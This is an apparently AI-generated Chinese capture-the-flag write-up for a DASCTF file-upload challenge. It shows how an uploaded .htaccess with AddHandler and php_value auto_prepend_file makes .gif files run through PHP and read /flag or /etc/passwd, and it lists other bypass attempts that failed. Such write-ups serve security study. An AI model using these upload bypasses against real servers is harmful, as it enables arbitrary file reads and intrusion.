---
AIGC:
  ContentProducer: '001191110102MAD55U9H0F10002'
  ContentPropagator: '001191110102MAD55U9H0F10002'
  Label: '1'
  ProduceID: 'f2c00de9-ccb5-4bcb-8c79-4f55624d801d'
  PropagateID: 'f2c00de9-ccb5-4bcb-8c79-4f55624d801d'
  ReservedCode1: 'e2b18aa7-dfac-4443-81db-8b21b3285e38'
  ReservedCode2: 'e2b18aa7-dfac-4443-81db-8b21b3285e38'
---

# DASCTF 文件上传 — .htaccess AddHandler + php_value auto_prepend_file 读取 Flag

## 题目信息

- **平台**: DASCTF
- **类型**: Web / 文件上传
- **Flag**: `CTF2{1d7011ab-8b57-433d-8cdd-236c895156bf}`

## 题目分析

### 服务器架构

- **Nginx (OpenResty)** 反代 **Apache/2.4.18 (Ubuntu)** + **PHP (mod_php 模式)**
- 上传目录：`/uploads/MD5(请求IP)/`，按请求 IP 哈希分配子目录
- 目录列表开启（AutoIndex）
- DASCTF 代理导致每次请求 IP 不稳定，上传文件可能分散到不同目录

### 上传过滤规则

| 检查项 | 规则 | 绕过方式 |
|--------|------|----------|
| **后缀黑名单** | 拦截所有含 `php` 的后缀（大小写不敏感）：`.php`, `.phtml`, `.php5`, `.phps` 等 | 无直接绕过 |
| **内容检测** | 拦截 `<?php`、`<?`、`<?=` 标签 | `<script language="php">` 不被拦截（但 PHP7 不识别） |
| **图片检测** | `getimagesize()` 或类似检查 | `GIF89a` 文件头可绕过 |
| **前端 JS 白名单** | 仅允许 gif/jpeg/jpg/png | 前端限制，可绕过 |

### .htaccess 允许的指令（AllowOverride 包含 FileInfo）

| 指令 | 是否生效 |
|------|----------|
| `AddType` / `AddHandler` | 生效 |
| `ErrorDocument` | 生效 |
| `FallbackResource` | 生效（但无法使 .user.ini 在上传目录触发） |
| `php_value` / `php_flag` | **生效**（关键突破点） |
| `Options +ExecCGI` | 不导致 500 但 CGI 不执行 |
| `RewriteEngine On` | 导致 500（不允许） |
| `Options +Includes` | 导致 500（不允许） |

## 解题思路

### 核心矛盾

1. `.php` 后缀被黑名单全面拦截 → 无法创建可被 PHP 解析的文件
2. `<?php`/`<?`/`<?=` 被内容检测拦截 → 无法写入直接执行的 PHP 代码
3. `<script language="php">` 可上传但 **PHP 7 不识别**
4. Nginx 只将 `.php` 后缀请求转发给 PHP-FPM，`.gif` 文件直接作为静态文件返回

### 关键突破

**发现 1：.gif 请求经过 Apache**

通过上传 `.htaccess` 设置 `AddType text/plain .gif`，发现请求 `.gif` 文件时 Content-Type 变为 `text/plain`，证明 `.gif` 请求确实经过了 Apache（非 Nginx 直接返回）。

**发现 2：AddHandler 让 .gif 被 PHP 处理**

```apache
AddHandler application/x-httpd-php .gif
```

此指令让 Apache 将 `.gif` 文件交给 PHP 引擎处理。请求 `.gif` 文件后返回 `Content-Type: text/html`，确认 PHP 引擎处理了文件。

**发现 3：php_value auto_prepend_file 生效**

```apache
php_value auto_prepend_file /etc/passwd
```

请求 `.gif` 文件时，`/etc/passwd` 的内容出现在输出中！说明 `php_value` 指令在 **mod_php** 模式下生效（PHP-FPM 模式下 `.htaccess` 的 `php_value` 通常不生效）。

### 最终 Payload

**Step 1：上传 .htaccess**

```apache
AddHandler application/x-httpd-php .gif
php_value auto_prepend_file /flag
```

- `AddHandler`：让 `.gif` 文件被 PHP 引擎处理
- `php_value auto_prepend_file /flag`：在执行任何 PHP 文件前自动包含 `/flag`

**Step 2：上传任意 .gif 文件**

文件内容不重要，只需通过上传检测（加 GIF89a 头即可）：

```
GIF89a<script language="php">echo "test";</script>
```

**Step 3：请求 .gif 文件获取 flag**

```
GET /uploads/xxx/shell.gif
```

响应体开头即为 flag 内容：

```
CTF2{1d7011ab-8b57-433d-8cdd-236c895156bf}
```

## 失败路径总结

| 方案 | 失败原因 |
|------|----------|
| 直接上传 `.php` 后缀 | 黑名单拦截所有含 `php` 的后缀 |
| `.php.`（尾部点号）绕过 | 可上传但 Nginx 不匹配 `\.php$`，不转发给 PHP |
| 空字节截断 `.php\x00.gif` | 黑名单检测文件名中的 `php` 子串 |
| `<script language="php">` 标签 | PHP 7 移除了此标签支持 |
| `.user.ini` + `auto_prepend_file` | 需要 PHP-FPM 模式且目录下有 `.php` 文件，不满足触发条件 |
| `SetHandler "proxy:fcgi://..."` | PHP-FPM 的 `security.limit_extensions` 限制 |
| `Options +Includes` + SSI | AllowOverride 不包含 Options |
| `Options +ExecCGI` + CGI 脚本 | Nginx 缓存静态文件，`.gif` 请求可能不经过 Apache 的 CGI 处理 |
| `ErrorDocument 404 /index.php` | 内部重定向后 SCRIPT_FILENAME 变为根目录，不加载上传目录的 `.user.ini` |
| `FallbackResource` | 同上，无法使上传目录的 `.user.ini` 生效 |

## 知识点总结

### 1. AddHandler vs AddType

- `AddType`：只修改 MIME 类型（Content-Type），**不改变处理方式**
- `AddHandler`：**改变处理方式**，将文件交给指定 handler 处理
- 在 PHP 场景中，`AddHandler application/x-httpd-php .gif` 才能让 `.gif` 被真正执行

### 2. php_value 在 mod_php vs PHP-FPM 模式下的差异

| 模式 | .htaccess php_value | .user.ini |
|------|---------------------|-----------|
| **mod_php** | **生效**（即时） | 不生效 |
| **PHP-FPM** | 通常不生效 | **生效**（有缓存延迟） |

本题为 **mod_php** 模式，所以 `.htaccess` 的 `php_value auto_prepend_file` 即时生效，无需等待缓存。

### 3. auto_prepend_file 读取任意文件

`auto_prepend_file` 不仅限于包含 PHP 文件，**任何文件都可以被包含**：
- 如果文件内容不含 PHP 标签（`<?php`），内容会被当做 HTML 直接输出
- 这使得 `auto_prepend_file=/flag` 成为一种通用的任意文件读取手段

### 4. DASCTF 代理 IP 不稳定

DASCTF 平台的代理会导致每次请求的源 IP 不同，上传目录基于 `MD5(IP)` 计算。需要多次重试才能让多个文件上传到同一目录。

> AI生成